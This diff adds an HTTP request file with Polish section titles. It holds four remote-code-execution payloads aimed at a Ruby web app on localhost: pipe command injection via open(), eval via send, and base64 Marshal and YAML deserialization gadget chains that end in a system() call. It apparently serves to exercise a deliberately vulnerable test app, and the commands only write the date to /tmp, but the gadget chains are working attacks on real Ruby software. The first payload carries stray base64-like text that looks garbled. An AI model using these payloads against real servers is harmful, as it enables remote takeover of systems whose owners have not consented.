@@ -1,0 +1,15 @@
+### RCE poprzez funkcję open
+GET http://127.0.0.1:3000/?url=|date>>/tmp/rce1.txtfY29tbWFuZC5jb25jYXQoNjIuY2hyKTsgb3NfY29tbWFuZC5jb25jYXQoNjIuY2hyKTsgb3NfY29tbWFuZC5jb
+
+### RCE poprzez send (wywołanie eval)
+GET http://127.0.0.1:3000/?send_method_name=eval&send_argument=`date>>/tmp/rce2.txt`
+
+### RCE poprzez deserializację Marshal (Base64)
+GET http://127.0.0.1:3000/?base64binary=BAhVOixBY3RpdmVSZWNvcmQ6OkFzc29jaWF0aW9uczo6QXNzb2NpYXRpb25bB286E0dlbTo6SW5zdGFsbGVyAG86HEdlbTo6UGFja2FnZTo6VGFyUmVhZGVyBzoOQGluaXRfcG9zbzoVR2VtOjpTcGVjRmV0Y2hlcgA6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7Cm86I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQc6DEBoZWFkZXJJIgliYmJiBjoGRVQ6EkBkZWJ1Z19vdXRwdXRvOgtMb2dnZXIGOgxAbG9nZGV2bzoTUmFjazo6UmVzcG9uc2UIOg5AYnVmZmVyZWRGOgpAYm9keW86CFNldAY6CkBoYXNofQZvOhpHZW06OlNlY3VyaXR5OjpQb2xpY3kGOgpAbmFtZXsJOg1maWxlbmFtZUkiES90bXAveHl6LnR4dAY7D1Q6EGVudmlyb25tZW50bzomUmFpbHM6OkluaXRpYWxpemFibGU6OkluaXRpYWxpemVyBjoNQGNvbnRleHRvOhdTcHJvY2tldHM6OkNvbnRleHQAOglkYXRhSSIBizwlPSBvc19jb21tYW5kID0gJ2RhdGUgJzsgb3NfY29tbWFuZC5jb25jYXQoNjIuY2hyKTsgb3NfY29tbWFuZC5jb25jYXQoNjIuY2hyKTsgb3NfY29tbWFuZC5jb25jYXQoJy90bXAvcmNlOWEudHh0Jyk7IHN5c3RlbShvc19jb21tYW5kKTsgJT4GOw9UOg1tZXRhZGF0YXsAVEY6DEB3cml0ZXJvOhxTcHJvY2tldHM6OkVSQlByb2Nlc3NvcgA=
+
+### RCE poprzez YAML deserializację
+POST http://127.0.0.1:3000/
+Content-Type: application/json
+Content-Length: 1095
+
+{"yaml":":payload:\n- !ruby/class 'Gem::SpecFetcher'\n- !ruby/class 'Gem::Installer'\n- !ruby/object:Gem::Requirement\n  requirements: !ruby/object:Gem::Package::TarReader\n    io: !ruby/object:Net::BufferedIO\n      io: !ruby/object:Gem::Package::TarReader::Entry\n        read: 0\n        header: aaa\n      debug_output: !ruby/object:Net::WriteAdapter\n        socket: !ruby/object:Gem::RequestSet\n          sets: !ruby/object:Net::WriteAdapter\n            socket: !ruby/module 'Kernel'\n            method_id: :system\n          git_set: date >> /tmp/rce2.txt\n        method_id: :resolve"}
